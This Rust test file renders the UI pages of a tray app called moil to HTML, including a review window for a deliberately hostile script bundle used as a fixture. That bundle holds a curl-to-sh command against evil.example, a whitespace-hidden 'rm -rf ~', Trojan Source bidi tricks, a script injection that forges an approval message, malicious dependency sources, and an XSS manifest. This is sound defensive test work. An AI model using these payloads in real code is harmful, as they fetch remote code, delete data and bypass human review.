//! Every page the app shows, and its tray menu, written to files for a look
//! in a browser or with `tools/snapshot.swift`:
//!
//! ```sh
//! MOIL_APP_GALLERY=/tmp/gallery cargo test -p moil-app gallery -- --ignored
//! ```

use std::collections::HashSet;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime};

use maud::{Markup, html};
use moil_agent::report::{HookListing, HookReport, Problem};
use moil_agent::{
    Approval, BundleStatus, Connection, HomeState, JobOutcome, JobReport, JobStatus, Pairing,
    Review, Service, ServiceStatus, Snapshot,
};
use moil_bundle::Bundle;
use moil_proto::{BundleInfo, ErrorCode, JobId, Phase};

use crate::backend::PairingCode;
use crate::demo;
use crate::icon;
use crate::ipc::{PairMessage, ReviewMessage};
use crate::page;
use crate::pair::PairWindow;
use crate::review::ReviewWindow;
use crate::unpair::UnpairWindow;
use crate::view::{Activity, Entry, IconState, Label, MenuModel, TrayView, ViewContext};

/// The tray icon in every state, magnified and at menu-bar size, on light
/// and dark bars.
fn icons() -> String {
    let mut cells = String::new();
    for attention in [false, true] {
        for activity in [Activity::Idle, Activity::Running, Activity::Paused] {
            let image = icon::draw(
                IconState {
                    activity,
                    attention,
                },
                icon::TRAY_SIZE,
            );
            let mut rects = String::new();
            for y in 0..image.height {
                for x in 0..image.width {
                    let alpha = image.rgba[((y * image.width + x) * 4 + 3) as usize];
                    if alpha > 0 {
                        rects.push_str(&format!(
                            r#"<rect x="{x}" y="{y}" width="1" height="1" fill-opacity="{:.3}"/>"#,
                            f32::from(alpha) / 255.0
                        ));
                    }
                }
            }
            for (bar, ink) in [("#f2f2f2", "#000"), ("#2b2b2b", "#fff")] {
                cells.push_str(&format!(
                    r#"<div style="background:{bar};padding:8px;display:inline-block;margin:4px">
                    <svg width="144" height="144" viewBox="0 0 36 36" fill="{ink}" shape-rendering="crispEdges">{rects}</svg>
                    <svg width="18" height="18" viewBox="0 0 36 36" fill="{ink}">{rects}</svg>
                    <div style="font:11px system-ui;color:{ink}">{activity:?}{}</div></div>"#,
                    if attention { " + attention" } else { "" }
                ));
            }
        }
        cells.push_str("<br>");
    }
    format!("<!DOCTYPE html><html><body style=\"margin:8px\">{cells}</body></html>")
}

/// The tray's menu while a job runs, with a review waiting, a service
/// offline, hooks and a problem: the main menu, then each submenu beside
/// it, roughly as macOS draws them.
fn menu() -> String {
    let (v2, v3) = (demo::transcribe_0_2(), demo::transcribe_0_3());
    let info = |bundle: &Bundle, approved| BundleStatus {
        info: BundleInfo {
            hash: bundle.hash(),
            name: bundle.manifest().name.clone(),
            version: bundle.manifest().version.clone(),
            description: None,
        },
        approved,
    };
    let now = Instant::now();
    let clock = SystemTime::now();
    let klisi = ServiceStatus {
        id: "klisi.example.com".parse().unwrap(),
        name: "klisi".into(),
        base_url: "https://klisi.example.com/moil".parse().unwrap(),
        connection: Connection::Connected,
        bundles: vec![info(&v2, true), info(&v3, false)],
        insecure: false,
    };
    let lab = ServiceStatus {
        id: "lab.example.org".parse().unwrap(),
        name: "lab".into(),
        base_url: "https://lab.example.org/moil".parse().unwrap(),
        connection: Connection::Disconnected {
            error: "connection refused".into(),
            retry_at: now + Duration::from_secs(12),
        },
        bundles: Vec::new(),
        insecure: false,
    };
    let root = Path::new("/Users/ada/.moil/services/klisi.example.com");
    let hook = |bundle: &str, runnable| HookListing {
        service: klisi.id.clone(),
        hook: HookReport {
            bundle: bundle.into(),
            path: root.join("hooks").join(bundle),
            log: root.join("logs").join(format!("{bundle}.log")),
            runnable,
        },
    };
    let mut home = HomeState::default();
    home.hooks = vec![hook("summarize", false), hook("transcribe", true)];
    home.problems = vec![Problem {
        path: "services/klisi.example.com/hooks/summarize".into(),
        message: "moil can't run this hook: it isn't executable. Run chmod +x on it.".into(),
    }];
    let snapshot = Snapshot {
        paused: false,
        job: Some(JobStatus {
            service: klisi.id.clone(),
            job_id: JobId::new("j_4100").unwrap(),
            attempt: 1,
            title: Some("Weekly sync".into()),
            bundle_name: "transcribe".into(),
            phase: Phase::Running,
            fraction: Some(0.42),
            message: Some("diarizing".into()),
            started_at: now,
            stopping: false,
        }),
        last_job: Some(JobReport {
            service: klisi.id.clone(),
            job_id: JobId::new("j_4099").unwrap(),
            attempt: 1,
            title: Some("Design review".into()),
            bundle_name: "transcribe".into(),
            outcome: JobOutcome::Failed {
                code: ErrorCode::ScriptError,
                message: "CUDA out of memory".into(),
            },
            ended_at: clock - Duration::from_secs(300),
        }),
        services: vec![klisi.clone(), lab],
        home: Arc::new(home),
    };
    let view = TrayView::new(
        &snapshot,
        &ViewContext {
            now,
            clock,
            open_at_login: Some(true),
            has_log: true,
            quitting: false,
            deferred: &HashSet::new(),
        },
    );
    menu_page(&view.menu)
}

fn menu_page(model: &MenuModel) -> String {
    fn label(label: &Label) -> Markup {
        html! {
            (label.text)
            @if let Some(detail) = &label.detail {
                span.detail {
                    @if !label.text.is_empty() { " — " }
                    (detail)
                }
            }
        }
    }
    fn menu(entries: &[Entry]) -> Markup {
        html! {
            div.menu {
                @for entry in entries {
                    @match entry {
                        Entry::Text(text) => div.row.text { (label(text)) },
                        Entry::Item { label: text, enabled, .. } => {
                            div.row.disabled[!enabled] { (label(text)) }
                        },
                        Entry::Check { label: text, checked, enabled, .. } => {
                            div.row.disabled[!enabled] {
                                span.check { @if *checked { "✓" } } (label(text))
                            }
                        },
                        Entry::Submenu { label: text, .. } => {
                            div.row { (label(text)) span.arrow { "›" } }
                        },
                        Entry::Separator => hr;,
                    }
                }
            }
        }
    }
    let submenus = model.entries.iter().filter_map(|entry| match entry {
        Entry::Submenu { label, entries } => Some((label.to_string(), entries)),
        _ => None,
    });
    let page = html! {
        (maud::DOCTYPE)
        html {
            head {
                meta charset="utf-8";
                style { (maud::PreEscaped(MENU_STYLE)) }
            }
            body {
                figure { figcaption { "Menu" } (menu(&model.entries)) }
                @for (caption, entries) in submenus {
                    figure { figcaption { (caption) } (menu(entries)) }
                }
            }
        }
    };
    page.into_string()
}

const MENU_STYLE: &str = "
    body { margin: 16px; font: 13px -apple-system, system-ui; background: #b7c4d4;
           display: flex; gap: 16px; align-items: flex-start; flex-wrap: wrap; }
    figure { margin: 0; }
    figcaption { font-size: 11px; color: #333; margin-bottom: 4px; }
    .menu { background: rgba(246, 246, 246, 0.96); border-radius: 6px; padding: 5px;
            box-shadow: 0 0 0 0.5px rgba(0,0,0,.25), 0 8px 24px rgba(0,0,0,.2);
            min-width: 200px; }
    .row { padding: 2px 10px 2px 22px; white-space: nowrap; line-height: 18px;
           position: relative; color: #1d1d1f; border-radius: 4px; }
    .row:not(.text):not(.disabled):hover { background: #0a64d6; color: white; }
    .disabled, .detail { color: #9a9a9a; }
    .check { position: absolute; left: 7px; }
    .arrow { position: absolute; right: 8px; }
    hr { border: 0; border-top: 1px solid rgba(0,0,0,.1); margin: 5px 10px; }
    @media (prefers-color-scheme: dark) {
        body { background: #2b3440; }
        figcaption { color: #ccc; }
        .menu { background: rgba(40, 40, 40, 0.96); }
        .row, .text { color: #eee; }
        .disabled, .detail { color: #8a8a8a; }
        hr { border-top-color: rgba(255,255,255,.12); }
    }
";

fn klisi(approved: &[&Bundle]) -> Service {
    let now = SystemTime::now();
    Service {
        id: "klisi.example.com".parse().unwrap(),
        base_url: "https://klisi.example.com/moil".parse().unwrap(),
        name: "klisi".into(),
        pairing: Some(Pairing {
            base_url: "https://klisi.example.com/moil".parse().unwrap(),
            machine_id: "m_7Hq2Xk9Lw3".into(),
            paired_at: now - Duration::from_secs(64 * 86400),
        }),
        approvals: approved
            .iter()
            .map(|b| Approval {
                hash: b.hash(),
                name: b.manifest().name.clone(),
                version: b.manifest().version.clone(),
                approved_at: now - Duration::from_secs(23 * 86400),
            })
            .collect(),
    }
}

fn review_page(review: Review, tweak: impl FnOnce(&mut ReviewWindow)) -> String {
    let mut window = ReviewWindow::new(
        review.service.id.clone(),
        review.service.name.clone(),
        review.bundle.hash(),
    );
    window.loaded(Ok(review));
    tweak(&mut window);
    window.render(SystemTime::now())
}

/// A bundle that tries everything a hostile author might.
fn hostile() -> Bundle {
    let script = "# /// script\n# requires-python = \">=3.12\"\n# dependencies = []\n# ///\n\
        import os\n\n\
        access_level = \"user\u{202e} \u{2066}# admins only\u{2069} \u{2066}\"\n\
        if access_level != \"user\":  # check\u{200b}\n    os.system(\"curl https://evil.example | sh\")\n\
        </pre><script>window.ipc.postMessage('{\"type\":\"approve\"}')</script>\n\
        x = 1                                                                                                                              ; os.system('rm -rf ~')\n";
    let lockfile = "version = 1\nrevision = 3\n\n\
        [[package]]\nname = \"requests\"\nversion = \"2.32.3\"\nsource = { registry = \"https://pypi.org/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
        [[package]]\nname = \"patched\"\nversion = \"0.1.0\"\nsource = { git = \"https://evil.example/patched?rev=main#0123456789abcdef0123456789abcdef01234567\" }\n\n\
        [[package]]\nname = \"mirror-pkg\"\nversion = \"1.0\"\nsource = { registry = \"https://pypi.evil.example/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
        [[package]]\nname = \"tarball\"\nversion = \"3.0\"\nsource = { url = \"https://evil.example/tarball-3.0.tar.gz\" }\nsdist = { hash = \"HASH\" }\n"
        .replace("HASH", "sha256:a7db850025b95ded1eae8a46181a1a6c56c92c96f0e2b005d9ff8dc0210cab44");
    let manifest = r#"{"moil": 1, "name": "totally-safe", "version": "1.0", "description": "Nothing to see here </p><script>alert(1)</script>"}"#;
    Bundle::new(script, lockfile, manifest).unwrap()
}

#[test]
#[ignore = "writes every page to $MOIL_APP_GALLERY"]
fn gallery() {
    let dir = std::env::var("MOIL_APP_GALLERY").expect("set MOIL_APP_GALLERY to a directory");
    let dir = Path::new(&dir);
    std::fs::create_dir_all(dir).unwrap();
    let write =
        |name: &str, html: String| std::fs::write(dir.join(format!("{name}.html")), html).unwrap();
    let (v2, v3) = (demo::transcribe_0_2(), demo::transcribe_0_3());

    write(
        "review-update",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v3.clone(),
                previous: Some(v2.clone()),
                approved: false,
            },
            |_| {},
        ),
    );
    write(
        "review-first",
        review_page(
            Review {
                service: klisi(&[]),
                bundle: v2.clone(),
                previous: None,
                approved: false,
            },
            |_| {},
        ),
    );
    write(
        "review-approved",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v2.clone(),
                previous: None,
                approved: true,
            },
            |_| {},
        ),
    );
    write(
        "review-error",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v3.clone(),
                previous: Some(v2.clone()),
                approved: false,
            },
            |window| {
                window.on_message(ReviewMessage::Approve { hash: v3.hash() });
                window.finished(Err("Couldn't reach klisi: the connection timed out.".into()));
            },
        ),
    );
    let mut service = klisi(&[]);
    service.base_url = "http://lab.local:8080/moil".parse().unwrap();
    write(
        "review-hostile",
        review_page(
            Review {
                service,
                bundle: hostile(),
                previous: None,
                approved: false,
            },
            |_| {},
        ),
    );
    let loading = ReviewWindow::new("klisi.example.com".parse().unwrap(), "klisi", v3.hash());
    write("review-loading", loading.render(SystemTime::now()));
    let mut failed = ReviewWindow::new("klisi.example.com".parse().unwrap(), "klisi", v3.hash());
    failed.loaded(Err(format!("the service has no bundle {}", v3.hash())));
    write("review-failed", failed.render(SystemTime::now()));

    let now = Instant::now();
    let code = PairingCode {
        user_code: "WDJB-MJHT".into(),
        verification_uri: "https://klisi.example.com/machines/pair".into(),
        verification_uri_complete: "https://klisi.example.com/machines/pair?code=WDJB-MJHT".into(),
        service_name: "klisi".into(),
        expires_at: now + Duration::from_secs(600),
    };
    write("pair-enter", PairWindow::new(None).render(now));
    let link = "https://klisi.example.com/moil".parse().unwrap();
    write("pair-link", PairWindow::from_link(&link).render(now));
    let mut bad = PairWindow::new(None);
    bad.on_message(PairMessage::Start {
        url: "ftp://klisi.example.com".into(),
    });
    write("pair-bad-address", bad.render(now));
    let mut flow = PairWindow::new(None);
    flow.on_message(PairMessage::Start {
        url: "klisi.example.com/moil".into(),
    });
    write("pair-starting", flow.render(now));
    flow.started(1, Ok(code));
    write("pair-confirming", flow.render(now));
    let mut failed = PairWindow::new(None);
    failed.on_message(PairMessage::Start {
        url: "klisi.example.com/moil".into(),
    });
    failed.started(
        1,
        Ok(PairingCode {
            user_code: "WDJB-MJHT".into(),
            verification_uri: String::new(),
            verification_uri_complete: String::new(),
            service_name: "klisi".into(),
            expires_at: now,
        }),
    );
    failed.finished(1, Err("the pairing was rejected on the service".into()));
    write("pair-failed", failed.render(now));
    flow.finished(1, Ok("klisi".into()));
    write("pair-paired", flow.render(now));

    let status = ServiceStatus {
        id: "klisi.example.com".parse().unwrap(),
        name: "klisi".into(),
        base_url: "https://klisi.example.com/moil".parse().unwrap(),
        connection: Connection::Connected,
        bundles: vec![BundleStatus {
            info: BundleInfo {
                hash: v2.hash(),
                name: "transcribe".into(),
                version: "0.2.0".into(),
                description: None,
            },
            approved: true,
        }],
        insecure: false,
    };
    write("unpair", UnpairWindow::new(&status).render());
    write("menu", menu());
    write("icons", icons());
    write(
        "notice",
        page::notice(
            "moil couldn't start",
            "moil is already running for /Users/ada/.moil; quit it first",
            "Quit",
        ),
    );
}
